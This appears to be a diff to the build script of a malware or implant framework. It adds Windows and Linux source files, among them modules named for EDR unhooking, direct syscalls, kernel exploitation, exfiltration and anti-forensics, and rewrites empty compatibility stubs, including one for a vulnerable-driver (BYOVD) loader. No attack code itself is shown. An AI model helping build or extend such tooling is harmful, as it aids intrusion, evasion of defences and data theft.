@@ -92,9 +92,10 @@ class LinkStage(Stage):
         # Windows-only sources
         windows_sources = []
         if target_os == "windows":
-            windows_sources = [
+            potential_sources = [
                 runtime_dir / "util"         / "mem.c",
                 runtime_dir / "windows"      / "windows_utils.c",
+                runtime_dir / "windows"      / "windows_api_impl.c",
                 runtime_dir / "windows"      / "registry" / "registry.c",
                 runtime_dir / "evasion"      / "unhook.c",
                 runtime_dir / "evasion"      / "syscalls.c",
@@ -106,9 +107,19 @@ class LinkStage(Stage):
                 runtime_dir / "exploitation" / "kernel_exploit.c",
                 runtime_dir / "exfil"        / "exfil.c",
                 runtime_dir / "cleanup"      / "forensics.c",
+                runtime_dir / "forensics"    / "forensic_api_impl.c",
             ]
+            windows_sources = [s for s in potential_sources if s.exists()]
 
-        all_sources = [s for s in portable_sources + windows_sources if s.exists()]
+        # Linux-specific sources
+        linux_sources = []
+        if target_os == "linux":
+            linux_potential = [
+                runtime_dir / "forensics"    / "forensic_api_impl.c",
+            ]
+            linux_sources = [s for s in linux_potential if s.exists()]
+
+        all_sources = [s for s in portable_sources + windows_sources + linux_sources if s.exists()]
         if not all_sources:
             return []
 
@@ -132,18 +143,22 @@ class LinkStage(Stage):
         # Add compatibility symbols stub for missing FFI declarations
         compat_c = out_dir / "compat_stub.c"
         compat_o = out_dir / "compat_stub.o"
+
+        # Platform-specific compat functions
         if target_os == "windows":
-            compat_c.write_text(
-                "#include <stddef.h>\n"
-                "long ptrace(int req, int pid, void* addr, void* data) { (void)req; (void)pid; (void)addr; (void)data; return 0; }\n"
-                "int jocky_manifest_load(const char* p) { (void)p; return 0; }\n"
-                "void jocky_byovd_unload(void* ctx) { (void)ctx; }\n"
-            )
-        else:
-            compat_c.write_text(
-                "#include <stddef.h>\n"
-                "long ptrace(int req, int pid, void* addr, void* data) { (void)req; (void)pid; (void)addr; (void)data; return 0; }\n"
-            )
+            compat_funcs = """#include <stddef.h>
+long ptrace(int req, int pid, void* addr, void* data) { (void)req; (void)pid; (void)addr; (void)data; return 0; }
+int jocky_manifest_load(const char* p) { (void)p; return 0; }
+void jocky_byovd_unload(void* ctx) { (void)ctx; }
+"""
+        else:  # Linux
+            compat_funcs = """#include <stddef.h>
+long ptrace(int req, int pid, void* addr, void* data) { (void)req; (void)pid; (void)addr; (void)data; return 0; }
+int fs_exists(const char* p) { (void)p; return 0; }
+int jocky_lkm_unload(int h) { (void)h; return 0; }
+int jocky_module_unload(void* h) { (void)h; return 0; }
+"""
+        compat_c.write_text(compat_funcs)
         target_flag = "--target=x86_64-pc-windows-gnu" if target_os == "windows" else "--target=x86_64-pc-linux-gnu"
         cmd = [str(tc.clang()), target_flag, "-c", str(compat_c), "-o", str(compat_o)]
         run_cmd(cmd, f"Compile compatibility stub ({target_os})")
